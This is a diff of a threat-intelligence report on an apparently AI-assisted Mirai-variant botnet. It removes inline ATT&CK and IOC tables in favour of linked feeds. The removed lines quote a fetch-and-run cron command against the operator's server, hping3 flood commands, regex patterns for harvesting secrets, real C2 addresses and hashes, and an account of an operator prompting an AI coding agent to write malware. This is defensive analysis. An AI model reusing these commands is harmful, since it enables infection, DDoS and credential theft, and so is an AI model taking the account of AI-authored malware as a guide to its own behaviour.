@@ -940,120 +940,17 @@ This is a defender-relevant operator-class signal — the operator demonstrably 
 
 ## 7. MITRE ATT&CK Mapping
 
-> **Confidence note:** all rows below are HIGH confidence unless explicitly marked `(MODERATE)`. The Confidence Summary in Section 11 organizes findings by confidence level for the higher-level view. The table also surfaces one **MITRE ATT&CK sub-technique gap** — the length-prefixed-string CNC option-key protocol modification (Section 4.1 / 6.3) defeats Mirai-protocol-aware IDS rules and has no equivalent characterization in the current T1095 (Non-Application Layer Protocol) sub-technique catalog. Defender signatures for this case must be authored at the campaign level for now.
+> **Analyst note:** This case's behaviors map to MITRE ATT&CK in the companion detection file, where each technique is tied to its detection logic. To keep this report focused, the full technique table is not duplicated inline.
 
-| Tactic / Technique | Name | Evidence |
-|---|---|---|
-| Resource Development / T1583.003 | Virtual Private Server | Operator-OWNED 1&1 IONOS DE VPS pair (same /16, AS8560) hosting Matrix C2 framework + bot distribution + VT-evasion test (IPs in Section 8) |
-| Resource Development / T1584.004 | Compromise Infrastructure: Server | Parasitic Naku CNC daemon on TCP/23 of compromised GetYourGroup tourism VPS (DigitalOcean AS14061; IP in Section 8); host continues to serve legitimate French-Alps tourism site on TCP/443 |
-| Resource Development / T1587.001 | Develop Capabilities: Malware | DEFINITE — 8 AI-co-authored framework files via Atlassian Rovodev (`master_control.py`, `attack_engine.py`, `multi_vector_agent.py`, `encrypted_agent.py`, `stealth_agent.py`, `mirai_clone.py`, `web_scraper_bot.py`, `persistent_bot.sh`) + operator-bespoke C modifications to Naku/Pandora bot suite (triple-XOR, length-prefixed-string CNC option keys, double Huawei scanner) |
-| Resource Development / T1588.001 | Obtain Capabilities: Malware | Operator inherited Sora-fork Pandora-Mirai source tree (open-source shared ecosystem; downstream-adopter status DEFINITE per Phase 11) |
-| Resource Development / T1588.005 | Obtain Capabilities: Exploits | CVE-2017-17215 (Huawei HG532) + CVE-2014-8361 (Realtek SDK MiniIGD) + CVE-2017-6077 (Netgear DGN) embedded plaintext in Naku.arm `.rodata` and in `matrix/exploits/` |
-| Initial Access / T1190 | Exploit Public-Facing Application | Four parallel scanner threads in Naku bot exploit Huawei + Realtek + ZyXEL + Dasan + Netis + Guangzhou + Micro Focus consumer-broadband CPE per `multi_cve.py` |
-| Initial Access / T1078.001 | Default Accounts | XOR-0x42 credential brute-list embedded in all 11 Naku architectures (DEFAULT, ADMIN, VIZXV, TTNET, GPON, ZTE, ROOT, etc.) — 128 concurrent telnet brute slots |
-| Initial Access / T1133 | External Remote Services | Naku CNC connection on TCP/23 to compromised parasitic-CNC host (IP in Section 8) from infected IoT devices |
-| Execution / T1059.006 | Python | Matrix C2 framework Python files (`master_control.py`, `attack_engine.py`, `multi_vector_agent.py`, etc.); `python3 /root/matrix/scripts/attack_engine.py` invocations from Discord bot dispatch table |
-| Execution / T1059.004 | Unix Shell | `persistent_bot.sh` 5-vector Linux persistence installer; `wget -qO- http://<operator-IONOS-VPS>/bot.sh \| bash` deployment pattern (operator IP in Section 8) |
-| Execution / T1059.007 | JavaScript | Discord bot dispatch table (`bot.js`) — JavaScript attack-method dispatch with emoji-branded display names |
-| Execution / T1106 | Native API | Naku.arm `socket()` + `connect()` + `ioctl()` syscalls for CNC connection + watchdog disable |
-| Persistence / T1547.013 | XDG Autostart Entries | `~/.bashrc` + `~/.profile` per-user shell rc file modifications in `persistent_bot.sh` vector 5 |
-| Persistence / T1543.002 | Systemd Service | `/etc/systemd/system/system-update.service` with `Restart=always` + 300s reseed loop in `persistent_bot.sh` vector 4 |
-| Persistence / T1053.003 | Cron | `/etc/cron.d/.cache_update` with `*/5 * * * * wget -qO- http://<operator-IONOS-VPS>/bot.sh \| bash` in `persistent_bot.sh` vector 1 (operator IP in Section 8) |
-| Persistence / T1037.004 | RC Scripts | `/etc/rc.local` modification in `persistent_bot.sh` vector 2; `/etc/init.d/sysupdate` System V service in vector 3 |
-| Persistence / T1546.004 | Unix Shell Configuration Modification | `~/.bashrc` + `~/.profile` modifications in `persistent_bot.sh` vector 5; triggers on every interactive login |
-| Defense Evasion / T1027 | Obfuscated Files or Information | Triple-XOR-key obfuscation (0x54 / 0x42 / 0x45) of operator-bespoke strings in all 11 Naku architectures |
-| Defense Evasion / T1014 | Rootkit | `stealth_agent.py` "simple rootkit install" capability per Hunt.io classifier brief; likely LD_PRELOAD-class libc hook (escalated-prompt AI authoring) |
-| Defense Evasion / T1036.004 | Match Legitimate Name or Location | Systemd unit `system-update.service` + init.d service `sysupdate` named to blend with legitimate update mechanisms; hidden filename `/etc/cron.d/.cache_update` |
-| Defense Evasion / T1497.001 | System Checks | `stealth_agent.py` anti-VM + sandbox checks via DMI / virtualization-vendor strings (escalated-prompt AI authoring) |
-| Defense Evasion / T1027.009 | Embedded Payloads | Pandora.sh dropper (SHA-256 in Section 8 IOC list) chains to per-arch Pandora.{arch} binaries |
-| Defense Evasion / T1564.001 | Hidden Files and Directories | `.rovodev/sessions/` + `.rovodev/logs/` directory naming with `.` prefix for AI-authoring session persistence |
-| Defense Evasion / T1070.004 | File Deletion | `whatineed.txt` prompt requests `clean files not needed` post-deploy; `stealth_agent.py` "self-destruct routine" capability per Hunt.io brief (MODERATE) |
-| Discovery / T1082 | System Information Discovery | `get_vendor()` function in `persistent_bot.sh` reads `/etc/mikrotik-release`, `/etc/openwrt_release`, `/proc/cpuinfo` for device-class segmentation |
-| Discovery / T1057 | Process Discovery | Naku.arm XOR-0x54-decoded `/bin/busybox ps` + `/proc/<pid>/{exe,fd,maps,status}` enumeration paths |
-| Discovery / T1016 | System Network Configuration Discovery | Naku.arm XOR-0x54-decoded `/proc/net/tcp` + `/proc/net/route` + `/etc/resolv.conf` enumeration paths |
-| Lateral Movement / T1210 | Exploitation of Remote Services | Four parallel scanner threads in Naku bot propagate via Huawei + Realtek exploits to neighboring IoT devices |
-| Credential Access / T1110.001 | Password Guessing | XOR-0x42 credential brute-list with 128 concurrent telnet brute slots against TCP/23 |
-| Credential Access / T1552.001 | Credentials in Files | `web_scraper_bot.py` regex extractors for AWS access keys (`AKIA[0-9A-Z]{16}`), GitHub PATs (`gh[pousr]_[A-Za-z0-9]{36}`), Slack tokens (`xox[baprs]-...`), Stripe live keys (`sk_live_[0-9a-zA-Z]{24}`) |
-| Collection / T1119 | Automated Collection | `web_scraper_bot.py` BFS web crawl (max_depth=2, same-domain link following, SSL verification disabled) |
-| Collection / T1213 | Data from Information Repositories | `web_scraper_bot.py` targets HTML source for password indicators (`['password', 'passwd', 'pwd', 'pass', 'secret', 'token', 'key']`) |
-| Command and Control / T1071.001 | Web Protocols | HTTP/80 bot distribution channel (operator IONOS VPS `/bot.sh`); HTTPS/443 VT-evasion test channel (`/bins/Naku.{arch}`); HTTP/80 victim-facing deploy (`/Pandoras_Box/Pandora.{arch}`) — IPs in Section 8 |
-| Command and Control / T1095 | Non-Application Layer Protocol | Matrix C2 on TCP/1337 with JSON-over-TCP wire protocol; Naku CNC on TCP/23 with **operator-bespoke length-prefixed-string option-key Mirai-variant protocol** (sub-technique gap — no documented MITRE ATT&CK sub-technique class) |
-| Command and Control / T1573.001 | Symmetric Cryptography | `encrypted_agent.py` AES-256-GCM + PBKDF2 key derivation + handshake per Hunt.io classifier brief |
-| Command and Control / T1090.001 | Internal Proxy | `master_control.py` calls `python3 {self.base_dir}/proxies/socks5_manager.py` for SOCKS5 proxy harvesting / chain orchestration |
-| Command and Control / T1132.001 | Standard Encoding | JSON-over-TCP wire protocol on Matrix C2 channel (TCP/1337); Mirai-canonical structured binary protocol on Naku CNC (TCP/23) |
-| Exfiltration / T1041 | Exfiltration Over C2 Channel | `web_scraper_bot.py` writes harvested credentials to `/root/matrix/logs/scrape_<domain>.txt` for operator collection (MODERATE — exfiltration channel not directly observed) |
-| Impact / T1498.001 | Direct Network Flood | `attack_engine.py` `udp_flood` + `tcp_syn_flood` + `tcp_ack_flood` + ICMP variants; `hping3 --udp --flood --rand-source --data 65500` for `ovh-nuke`; `hping3 --syn --flood --rand-source` for `syn-storm` |
-| Impact / T1498.002 | Reflection Amplification | `dns-rain` DNS amplification with EDNS padding; SQL data-load tuple `('syn-storm', 'layer4', 'SYN reflection amplification', 1.6, 'user')`; multiple amplification vectors (DNS / NTP / memcached / SSDP) per `attack_engine.py` |
-| Impact / T1499 | Endpoint Denial of Service | `layer7_ultra.py` aiohttp-based Layer 7 attack with Cloudflare-bypass + cache-bypass + random headers; `http-flood` with 100 threads no rate limit |
-
-**MITRE ATT&CK sub-technique gap (defender-relevant):** T1095 (Non-Application Layer Protocol) currently has no sub-technique class for IoT botnet protocol modification of the kind documented here. The Naku variant's length-prefixed-string CNC option-key protocol modification defeats stock Mirai-protocol-aware IDS rules. Defender signatures for this campaign must be authored at the campaign level (see linked detection file); a proposed sub-technique label "Mirai-variant CNC Protocol Modification" would close the gap and provide canonical TTP language for future cases.
+The full ATT&CK technique mapping for this case is maintained alongside the detection rules on the **[detection rules page →](https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/)**.
 
 ---
 
 ## 8. Indicators of Compromise
 
-> **Analyst note:** This section provides the human-readable summary view. The full validated machine-readable IOC feed (with confidence and context per indicator) is published separately at [`/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json`](/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json) per the project's IOC-formatting standard. The IOC feed is not defanged (machine-ingestion target); the report body summary table below covers the headline indicators only.
+> **Analyst note:** The complete IOC set for this case is published as a machine-readable JSON feed for direct SIEM/EDR ingestion — it is not duplicated inline here. The highest-priority indicators are also surfaced in the IOC panel (fingerprint icon) on this page.
 
-### 8.1 Network Indicators Summary
-
-| Indicator | Type | Confidence | Role |
-|---|---|---|---|
-| `87.106.143.220` | IPv4 | DEFINITE | Operator-OWNED primary IONOS DE VPS — Matrix C2 on TCP/1337 + bot.sh distribution on HTTP/80 + Naku VT-test on HTTPS/443 + Pandora deploy on HTTP/80 |
-| `87.106.54.213` | IPv4 | DEFINITE | Operator-OWNED backup IONOS DE VPS (same /16) — referenced in `IMPLEMENTATION_PLAN.txt` Phase 2 |
-| `165.227.175.161` | IPv4 | DEFINITE | Parasitic Naku CNC on compromised GetYourGroup tourism VPS (DigitalOcean) — hardcoded inline in Naku.arm main() as `0xa1afe3a5`; TCP/23 |
-| `80.211.94.16` | IPv4 | DEFINITE | Aruba S.p.A. Italy distribution server (AS31034) — embedded plaintext in all 11 Naku binaries as `http://80.211.94.16/Naku.mips`; currently OFFLINE as of 2026-05-26 (re-validate periodically) |
-| `80.211.111.10` | IPv4 | HIGH | Aruba S.p.A. Italy backup distribution server (AS31034) — fully dark to Hunt.io's 365-day index; OFFLINE as of 2026-05-26 (re-validate periodically) |
-| `http://87.106.143.220/bot.sh` | URL | DEFINITE | persistent_bot.sh deployment + reseed channel |
-| `http://87.106.143.220:443/bins/Naku.{arch}` | URL | DEFINITE | Operator-internal VT-evasion test channel (HTTPS) |
-| `http://87.106.143.220:80/Pandoras_Box/Pandora.{arch}` | URL | DEFINITE | Victim-facing campaign deploy channel (HTTP) |
-| `http://80.211.94.16/Naku.mips` | URL | DEFINITE | Embedded plaintext in all 11 Naku binaries' exploit payload |
-
-### 8.2 File Hash Indicators Summary (Sample)
-
-The full 23-hash inventory is published in the IOC feed. Headline samples:
-
-| SHA-256 | File | Confidence | Notes |
-|---|---|---|---|
-| `64afc3b3a02706ffcf4255bda4519f8c1c66daaaf937a2641fd14a551a34e383` | Naku.arm | DEFINITE | Pandora-Mirai 11-arch bot binary. VT 43/66. Microsoft Mirai.AW!xp |
-| `595f4315f00c2fce839eabe9880f669990256d6638fb148996872e37ffc9b28a` | Naku.arm7 | DEFINITE | Debug-symbol build exposing operator's Mirai source-tree composition |
-| `d3fd9994b16dc9b14c29f7faf7b5f6c84f44b06fccf82f0031a0871ce5e20e17` | Pandora.sh | DEFINITE | Pandora dropper SHA |
-| `e9e0eafc89e4a9db796c63bb4fdc5c0fd1106f8b9c234fb57e51a7934f2b8d8e` | master_control.py | DEFINITE | DEFINITE AI-authored (Rovodev session JSON `file_write` evidence) |
-| `921e4c1d86813838d40010e82a8f374a70b91f06008db5182d1ec6c2da672c09` | attack_engine.py | DEFINITE | DEFINITE AI-authored (5/5 AI-Generated Code Signature) |
-| `a19b972688158e361e8646ec17556ec46bf84f0cd24fb8707e4df85cb9d9a6d2` | multi_vector_agent.py | DEFINITE | DEFINITE AI-authored + Hunt.io classifier flagged Copy-Paste Indentation Decay |
-| `9e70449b2aafc71c7ff16ece42053fb41b92394cdb88ce799f60d50b4fbefa9e` | encrypted_agent.py | DEFINITE | DEFINITE AI-authored (Rovodev session JSON `file_write` evidence) |
-| `d1086ab3c06764ffd81492b4c723bda83bac19dc101c8542bc566e5888c92da3` | stealth_agent.py | DEFINITE | DEFINITE AI-authored (Rovodev session JSON `file_write` evidence; escalated-prompt anti-analysis content) |
-| `64ca12cae6f5e520abb4158da3bbc14e909c2128748ae0c5806fa4206cc14260` | mirai_clone.py | DEFINITE | DEFINITE AI-authored (5/5 AI-Generated Code Signature) |
-| `4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b` | persistent_bot.sh | DEFINITE | 5-vector Linux persistence installer (5/5 AI-Generated Code Signature) |
-| `fba4072941038d27a28a1089ab24d9c3e22f0db19994f3c12c688085903a6ded` | web_scraper_bot.py | DEFINITE | Post-exploitation credential / secret harvester (5/5 AI-Generated Code Signature) |
-
-### 8.3 Host Indicators Summary
-
-| Indicator | Type | Confidence | Notes |
-|---|---|---|---|
-| `/root/matrix/` | File path | DEFINITE | Matrix C2 framework root on operator host |
-| `/root/.rovodev/sessions/` | File path | DEFINITE | Rovodev AI authoring session JSON storage |
-| `/root/.rovodev/logs/rovodev.log` | File path | DEFINITE | Rovodev runtime CLI log (8.5 MB) |
-| `/etc/cron.d/.cache_update` | File path | DEFINITE | persistent_bot.sh vector 1 (cron persistence) |
-| `/etc/init.d/sysupdate` | File path | DEFINITE | persistent_bot.sh vector 3 (System V service) |
-| `/etc/systemd/system/system-update.service` | File path | DEFINITE | persistent_bot.sh vector 4 (systemd unit) |
-| `/etc/rc.local` | File path | DEFINITE | persistent_bot.sh vector 2 (RC scripts) |
-| `/dev/watchdog` | File path | DEFINITE | Naku.arm watchdog-disable persistence loop |
-| `/dev/misc/watchdog` | File path | DEFINITE | Alt watchdog path for some IoT devices |
-| `/tmp/pandora_bot` | File path | DEFINITE | VT-reported execution path for Naku binaries |
-| `PandoraNet` | Mutex / botnet ID | DEFINITE | Operator-bespoke botnet ID (suffixed by arch) |
-| `1gba4cdom53nhp12ei0kfj` | Mutex / charset | DEFINITE | Operator-bespoke 22-character random-string charset |
-| `/bin/busybox SORA` | String | DEFINITE | Sora-fork derivative signature decoded from XOR-0x54 |
-| `.anime` | String | DEFINITE | Operator-bespoke marker decoded from XOR-0x54 |
-
-### 8.4 Operator-Bespoke Detection Constants
-
-Five operator-bespoke constants together provide a near-zero-FP YARA fingerprint that catches all 11 Naku architectures with a single rule (full YARA in the linked detection file):
-
-- XOR keys `0x54` (general operational strings) + `0x42` (credential brute-list) + `0x45` (duplicate "assword" prompt entry)
-- 22-character charset `1gba4cdom53nhp12ei0kfj` (present in all 11 architectures)
-- Botnet ID `PandoraNet` (operator-bespoke; not observed elsewhere in Hunt.io's 365-day index)
-- Sora-fork token `/bin/busybox SORA` (XOR-0x54-encoded; distinguishes from stock Mirai's `/bin/busybox MIRAI`)
-- Operator-bespoke marker `.anime` (XOR-0x54-encoded)
+**Full IOC feed:** [`/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json`](https://the-hunters-ledger.com/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json) — every indicator for this case, with type / confidence / recommended action.
 
 ---
 
